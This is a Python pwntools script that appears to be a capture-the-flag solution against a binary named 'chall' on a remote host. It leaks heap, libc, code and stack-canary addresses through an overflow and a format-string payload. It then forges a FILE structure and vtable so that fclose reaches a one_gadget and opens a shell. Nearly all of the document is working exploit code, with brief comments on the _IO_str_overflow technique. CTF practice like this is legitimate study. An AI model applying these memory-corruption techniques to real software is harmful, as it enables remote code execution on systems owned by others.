from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '13.231.207.73'
PORT = 9008

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x10bc])

r.sendlineafter('> ', '1')
r.sendlineafter('> ', '2')
r.sendlineafter('> ', '3')
r.sendlineafter('Offset: ', '370')
r.sendlineafter('Text: ', 'A'*0x8e)

r.sendlineafter('> ', '2')
r.recvuntil('A'*0x8e)
fp = u64(r.recv(6) + '\x00'*2)
dbg("fp")

heap = fp - 0x260
dbg("heap")

r.sendlineafter('> ', '3')
r.sendlineafter('Offset: ', str(0x200))
payload = ''
payload += flat(0, 1, 0, 0)
payload += '%22$p @ %21$p @ %20$p @ \x00'
r.sendlineafter('Text: ', payload)

r.sendlineafter('> ', '1')
leak = r.recvuntil('grimoire')

libc = int(leak.split(' @ ')[0][:16], 16) - 0x21b97
code = int(leak.split(' @ ')[1], 16) - 0x14f0
canary = int(leak.split(' @ ')[2], 16)
dbg("libc")
dbg("code")
dbg("canary")

system = libc + 0x4f440
binsh = libc + 0x1b3e9a 
vtable = libc + 0x3e82a0

rax = libc + 0x000439c7
rdx = libc + 0x00001b96
rsi = libc + 0x00153761
syscall = libc + 0x001170e7
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

bss = code + 0x202000
rdi = code + 0x1553
call_rdx = libc + 0x0002c9c3


r.sendlineafter('> ', '3')
r.sendlineafter('Offset: ', str(0x200))

payload = ''
payload += flat(bss+0x60, 1, 0, 0)
r.sendlineafter('Text: ', payload)

r.sendlineafter('> ', '3')
r.sendlineafter('Offset: ', str(0))

payload = '' 
payload += p64(0) * 5
payload += p64(libc+gadget[0])
payload += p64(0) * 11
payload += p64(libc + 0x3ed8b0) # lock
payload += p64(0) * 9
payload += flat(vtable+0xc8, call_rdx)
payload = payload.ljust(0x200, 'A')

# vtable+0xc8: for abusing _IO_new_fclose() --> _IO_finish()
#   this will point _IO_str_overflow() 

# _IO_str_overflow() will exec QWORD PTR[rbx+0xe0]
#   where rbx = fake fp, rbx+0xe0 = "call rdx", rdx = one_gadget

r.sendafter('Text: ', payload)
r.sendlineafter('> ', '4')

r.interactive()




